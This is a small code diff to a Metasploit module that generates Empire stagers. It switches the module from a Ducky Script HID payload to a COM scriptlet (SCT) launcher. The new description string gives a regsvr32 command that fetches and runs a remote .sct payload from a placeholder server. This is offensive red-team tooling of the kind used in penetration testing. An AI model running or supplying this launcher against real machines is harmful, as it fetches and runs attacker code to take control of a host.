@@ -10,12 +10,12 @@ module MetasploitModule
 
   def initialize(info={})
     super(merge_info(info,
-    'Description'=> 'Creates a Ducky Script to be used in HID exploitations for Empire'
+                     'Description'=> 'Creates a SCT (COM Scriptlet) Payload for Empire, on the endpoint simply launch regsvr32 /u /n /s /i:http:http://server/file.sct scrobj.dll'
     ))
   end
 
-  def stager_generator(empireClient)
-    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/ducky')
+  def stagerGenerator(empireClient)
+    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/launcher_sct')
     return @stagerCode
   end
 end
